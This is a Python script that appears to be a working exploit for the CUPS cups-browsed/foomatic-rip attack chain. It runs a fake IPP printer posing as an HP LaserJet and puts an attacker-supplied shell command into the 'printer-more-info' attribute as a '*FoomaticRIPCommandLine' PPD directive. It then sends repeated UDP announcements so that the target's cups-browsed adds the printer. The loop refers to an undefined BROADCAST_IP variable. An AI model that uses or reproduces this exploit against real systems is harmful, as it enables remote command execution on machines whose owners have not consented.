import logging
import threading
import sys
import time
from ippserver.server import IPPRequestHandler, IPPServer
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.constants import (
    JobStateEnum, OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.request import IppRequest
from ippserver.behaviour import StatelessPrinter
import socket

# Define a custom Resolution class
class Resolution:
    def __init__(self, xres, yres, units):
        """
        :param xres: Horizontal resolution (in dpi or dpcm)
        :param yres: Vertical resolution (in dpi or dpcm)
        :param units: 3 for dpi (dots per inch), 4 for dpcm (dots per centimeter)
        """
        self.xres = xres
        self.yres = yres
        self.units = units

    def bytes(self):
        """
        Converts the resolution into a 9-byte binary string for IPP.
        4 bytes for xres, 4 bytes for yres, and 1 byte for units (dpi or dpcm).
        """
        return (
            self.xres.to_bytes(4, byteorder='big') +  # Convert xres to 4 bytes
            self.yres.to_bytes(4, byteorder='big') +  # Convert yres to 4 bytes
            int(self.units).to_bytes(1, byteorder='big')  # Convert units (3 for DPI) to 1 byte
        )

# Basic logging configuration
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class MyPrinter(StatelessPrinter):
    def __init__(self,command):
        self.command = command
    def printer_list_attributes(self):
        attr = {
            # RFC 2911 section 4.4 (Printer attributes)
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [b'My-IPP-Printer'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Simulated IPP Printer with Extended Attributes'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [b'HP LaserJet Pro M404dn'],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()],  # Printer state (3: idle)
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1', b'2.0'],  # IPP versions supported
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,  # Required by CUPS
                    OperationEnum.validate_job,  # Required by CUPS
                    OperationEnum.cancel_job,
                    OperationEnum.get_job_attributes,
                    OperationEnum.get_printer_attributes,
                )
            ],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],

            # Supported document formats
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [
                b'application/pdf',
                b'application/postscript',
                b'application/vnd.hp-PCL',
                b'text/plain',
                b'image/jpeg'
            ],

            # Resolution attributes
            (
                SectionEnum.printer,
                b'printer-resolution-default',
                TagEnum.resolution
            ): [Resolution(600, 600, 3).bytes()],  # 600x600 dpi
            (
                SectionEnum.printer,
                b'printer-resolution-supported',
                TagEnum.resolution
            ): [
                Resolution(300, 300, 3).bytes(),  # 300x300 dpi
                Resolution(600, 600, 3).bytes()   # 600x600 dpi
            ],

            # Media sizes
            (
                SectionEnum.printer,
                b'media-supported',
                TagEnum.keyword
            ): [b'A4', b'Letter', b'Legal', b'Executive'],

            # Duplex capabilities
            (
                SectionEnum.printer,
                b'duplex-supported',
                TagEnum.keyword
            ): [b'true'],

            # Default media
            (
                SectionEnum.printer,
                b'media-default',
                TagEnum.keyword
            ): [b'A4'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [Integer(0).bytes()],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'color-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],  # Monochrome printer
            (
                SectionEnum.printer,
                b'output-bin-supported',
                TagEnum.keyword
            ): [b'face-up', b'face-down'],

            (
                SectionEnum.printer,
                b'printer-more-info',
                TagEnum.uri
            ): [
                f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()
            ]
        }

        attr.update(self.minimal_attributes())  # Add any minimal/default attributes
        return attr

    def operation_printer_list_response(self, req, _psfile):
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes
        )

def run_server():
    """Start the IPP server and listen for incoming requests."""
    server = IPPServer(('10.13.13.49', 631), IPPRequestHandler, MyPrinter(command=COMMAND))
    logger.info("Starting the IPP server on 10.13.13.49:631...")
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    return server  # Return the server object for potential shutdown later

def send_browsed_packet(target_ip, port, ipp_server_host, ipp_server_port):
    """
    Send a UDP packet to a target IP to announce the IPP printer to cups-browsed.
    This mimics a network discovery that cups-browsed listens to.
    """
    print(f"Sending UDP packet to {target_ip}:{port}...")

    # Packet content - simulate a CUPS IPP printer advertisement
    printer_type = 2  # Remote printer type
    printer_state = 3  # Printer state as integer
    printer_uri = f'ipp://{ipp_server_host}:{ipp_server_port}/printers/MyPrinter'
    printer_location = '"Office Room 2, Floor 3"'
    printer_info = '"HP_LaserJet_Pro_M404dn"'
    printer_model = '"HP LaserJet Pro M404dn Printer"'

    # Create the packet with detailed information
    packet = (
        f"{printer_type:x} {printer_state} {printer_uri} {printer_location} "
        f"{printer_info} {printer_model}\n"
    )

    print(f"Packet content:\n{packet}")

    # Create the UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Send the UDP packet to the target IP
    sock.sendto(packet.encode('utf-8'), (target_ip, port))
    sock.close()

    print("UDP packet sent to target IP!")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <command>")
        sys.exit(1)

    TARGET_IP = sys.argv[3]
    CUPS_BROWSED_PORT = 631

    # Your IPP server details
    IPP_SERVER_HOST = sys.argv[2]
    IPP_SERVER_PORT = 631

    COMMAND=sys.argv[1]
    # Start the IPP server
    server = run_server()

    # Allow some time for the server to start
    time.sleep(2)  # Short delay to ensure server is running

    try:
        while True:
            send_browsed_packet(target_ip=BROADCAST_IP, port=CUPS_BROWSED_PORT, ipp_server_host=IPP_SERVER_HOST, ipp_server_port=IPP_SERVER_PORT)
            time.sleep(10)  # Wait for 10 seconds before sending the next packet
    except KeyboardInterrupt:
        logger.info("Shutting down the IPP server...")
        server.shutdown()
